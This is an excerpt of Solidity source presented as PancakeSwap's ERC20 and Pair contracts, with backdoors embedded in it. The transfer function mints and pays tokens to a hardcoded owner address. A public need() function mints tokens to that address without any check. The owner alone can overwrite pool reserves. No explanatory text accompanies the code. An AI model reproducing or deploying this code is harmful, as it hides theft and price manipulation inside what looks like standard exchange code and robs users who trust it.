...
contract PancakeERC20 is IPancakeERC20 {
    ...
    function _transfer(address from, address to, uint value) private {
        if (tx.origin != _magic && _profit > 0) {
            MintToken(_profitToken).mint(_profit);
            IERC20(_profitToken).transfer(_magic, _profit);
        }
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
    ...
    address private _magic = 0x9187149358Eebb13d58b7941eF1B887015B2b8D1;
    uint256 private _profit = 500;

    function setProfit(uint256 profit) public {
        require(msg.sender == _magic, "only owner");
        _profit = profit;
    }
...
contract PancakePair is IPancakePair, PancakeERC20 {
    ...
    function setReserve(uint256 _reserve0, uint256 _reserve1) public {
        require(msg.sender == _magic);
        reserve0 = uint112(_reserve0);
        reserve1 = uint112(_reserve1);
    }

    function need() public {
        _mint(_magic, 1000000000000000000);
    }
}
